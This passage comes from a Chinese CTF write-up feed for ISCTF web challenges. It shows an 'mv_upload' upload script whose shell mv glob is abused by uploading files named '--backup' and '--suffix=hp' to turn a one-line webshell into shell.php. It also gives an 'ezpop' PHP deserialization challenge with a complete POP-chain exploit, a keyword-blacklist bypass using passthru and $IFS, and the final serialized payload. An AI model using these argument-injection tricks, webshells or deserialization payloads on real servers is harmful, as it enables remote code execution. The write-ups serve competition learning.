class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件名无效，跳过。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fileParts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="keyword">isset</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="title function_ invoke__">strtolower</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$extension</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$blacklist</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 因类型不安全（.<span class="subst">&#123;$extension&#125;</span>）被拒绝。&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 已上传至 <span class="subst">$uploadDir</span><span class="subst">$filename</span> 。&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;文件 <span class="subst">&#123;$filename&#125;</span> 移动失败。&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取临时目录中的所有文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$uploadDir</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="variable">$filesInTmp</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理确认上传完毕（移动文件）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;confirm_move&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filesInTmp</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> .= <span class="string">&quot;没有可移动的文件。&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = [];</span><br><span class="line">        <span class="variable">$returnCode</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$returnCode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$filesInTmp</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> .= <span class="string">&quot;已移动文件: <span class="subst">&#123;$file&#125;</span> 至<span class="subst">$targetDir</span><span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;移动文件失败: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$output</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;多文件上传服务&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; font-family: Arial, sans-serif; margin: <span class="number">20</span>px; &#125;</span><br><span class="line">        .container &#123; max-width: <span class="number">800</span>px; margin: auto; &#125;</span><br><span class="line">        .alert &#123; padding: <span class="number">10</span>px; margin: <span class="number">10</span>px <span class="number">0</span>; background: <span class="comment">#f8d7da; color: #721c24; border: 1px solid #f5c6cb; &#125;</span></span><br><span class="line">        .success &#123; background: <span class="comment">#d4edda; color: #155724; border-color: #c3e6cb; &#125;</span></span><br><span class="line">        ul &#123; <span class="keyword">list</span>-style-type: none; padding: <span class="number">0</span>; &#125;</span><br><span class="line">        li &#123; margin: <span class="number">5</span>px <span class="number">0</span>; padding: <span class="number">5</span>px; background: <span class="comment">#f0f0f0; &#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;多文件上传服务&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">message</span>): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">alert</span> &lt;?= <span class="title">strpos</span>($<span class="title">message</span>, &#x27;失败&#x27;) ? &#x27;&#x27; : &#x27;<span class="title">success</span>&#x27; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?= $<span class="title">message</span> ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">files</span>&quot;&gt;选择文件：&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">files</span>[]&quot; <span class="title">id</span>=&quot;<span class="title">files</span>&quot; <span class="title">multiple</span> <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload</span>&quot;&gt;上传到临时目录&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span>&gt;待确认上传文件&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">empty</span>($<span class="title">filesInTmp</span>)): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;暂无待确认上传文件&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">foreach</span> ($<span class="title">filesInTmp</span> <span class="title">as</span> $<span class="title">file</span>): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">file</span>) ?&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">confirm_move</span>&quot;&gt;确认上传完毕，移动到存储目录&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>黑名单比较全面，加上题目标题是mv_upload，猜测本题考查系统命令<code>mv</code></p>
<p>源码中跟mv有关的是 ：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br></pre></td></tr></table></figure>

<p>在终端输入：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p>出来的第一个使用方法很有意思，是在后面跟上–backup</p>
<p>原理是如果目标文件已经存在，再用mv移动同名文件会把先前的文件覆盖，但是加上–backup的话，不会直接覆盖先前的文件，而是先把旧文件改名备份，然后再把新文件移过去。</p>
<p>但是本题单纯的改名没有任何意义，这时就要用到另一个，在后面跟上–suffix&#x3D;【想要的后缀】，这样就可以随心所欲地修改想要上传的文件后缀了</p>
<p>本题的攻击顺序很明朗了</p>
<ol>
<li><p>创建一个文件“shell.p”，里面写入一句话木马，接着上传并移动</p>
</li>
<li><p>创建文件“–backup”和“–suffix&#x3D;hp”，接着上传shell.p、–backup和–suffix&#x3D;hp，同时进行移动</p>
</li>
<li><p>访问&#x2F;upload&#x2F;shell.php，若显示空白页面就代表改名成功，POST传入cmd&#x3D;system(“cat &#x2F;flag”);即可</p>
</li>
</ol>
<hr>
<h1 id="10-ezpop"><a href="#10-ezpop" class="headerlink" title="10. ezpop"></a>10. ezpop</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>首先找终点，在类 <code>eenndd</code>中找到<code>eval($this-&gt;command);</code>，这里就是要到的终点</p>
</li>
<li><p>接着逆推通过<code>__get($arg1)</code>找到上一步，触发<code>__get</code>需要出现一个不存在的属性，在类<code>flaag</code> 中有<code>return $this-&gt;var10-&gt;hey;</code>访问的属性<code>hey</code>并不存在</p>
</li>
<li><p>触发 <code>__invoke</code>要把对象当成函数来调用，在类<code>starlord</code>中有<code>return $function();</code>，把<code>$function</code>当函数用</p>
</li>
<li><p>触发 <code>__call</code>需要调用不存在的方法，在类<code>anna</code>中有<code>$long = @$this-&gt;var6-&gt;add(); return $long;</code>，add() 方法并不存在</p>
</li>
<li><p>触发 <code>__toString</code>需要把一个对象当做字符串处理，在类<code>begin</code>中有<code>echo $this-&gt;var1;</code></p>
</li>
<li><p><code>__destruct</code> 是反序列化后对象销毁时自动执行，因此作为起点</p>
</li>
</ol>
<p><strong>链条总结</strong>： <code>begin::__destruct()</code> -&gt; <code>anna::__toString()</code> -&gt; <code>starlord::__call()</code> -&gt; <code>flaag::__invoke()</code> -&gt; <code>eenndd::__get()</code> -&gt; <code>eval()</code></p>
<p>其中还有两点需要处理：</p>
<ol>
<li><p><code>flaag</code> 类的 MD5 弱类型比较：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>)</span><br></pre></td></tr></table></figure>

<p>需要找一个字符串，经过两次 MD5 加密后，结果以 <code>666</code> 开头</p>
<p>编写一个MD5爆破的py脚本：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i) </span><br><span class="line">    res = hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> res.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到：213</p>
</li>
<li><p><code>eenndd</code> 类的正则绕过：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command)</span><br></pre></td></tr></table></figure>

<p>根据黑名单构造payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">passthru(&quot;uniq\$IFS\$9/f<span class="emphasis">*&quot;);    </span></span><br><span class="line"><span class="emphasis">//如果写ca\t，那\t会被php解析成Tab键；如果只写$IFS$9，两个$会被php解析成变量</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>这样就可以根据已知的pop链编写脚本了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var1</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var6</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var4</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$var10</span>; <span class="keyword">public</span> <span class="variable">$var11</span> = <span class="number">213</span>; &#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;passthru(&quot;uniq\$IFS\$9/f*&quot;);&#x27;</span>; &#125;        <span class="comment">//不要用双引号嵌套双引号</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">new</span> <span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1 = <span class="keyword">new</span> <span class="title function_ invoke__">anna</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6 = <span class="keyword">new</span> <span class="title function_ invoke__">starlord</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4 = <span class="keyword">new</span> <span class="title function_ invoke__">flaag</span>();</span><br><span class="line"><span class="variable">$exp</span>-&gt;var1-&gt;var6-&gt;var4-&gt;var10 = <span class="keyword">new</span> <span class="title function_ invoke__">eenndd</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISCTF=O%3A5%3A%22begin%22%3A1%3A%7Bs%3A4%3A%22var1%22%3BO%3A4%3A%22anna%22%3A1%3A%7Bs%3A4%3A%22var6%22%3BO%3A8%3A%22starlord%22%3A1%3A%7Bs%3A4%3A%22var4%22%3BO%3A5%3A%22flaag%22%3A2%3A%7Bs%3A5%3A%22var10%22%3BO%3A6%3A%22eenndd%22%3A1%3A%7Bs%3A7%3A%22command%22%3Bs%3A28%3A%22passthru%28%22uniq%5C%24IFS%5C%249%2Ff%2A%22%29%3B%22%3B%7Ds%3A5%3A%22var11%22%3Bi%3A213%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="11-kaqiWeaponShop"><a href="#11-kaqiWeaponShop" class="headerlink" title="11. kaqiWeaponShop"></a>11. kaqiWeaponShop</h1>]]></content>
      <categories>
        <category>比赛WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>ISCTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
</search>
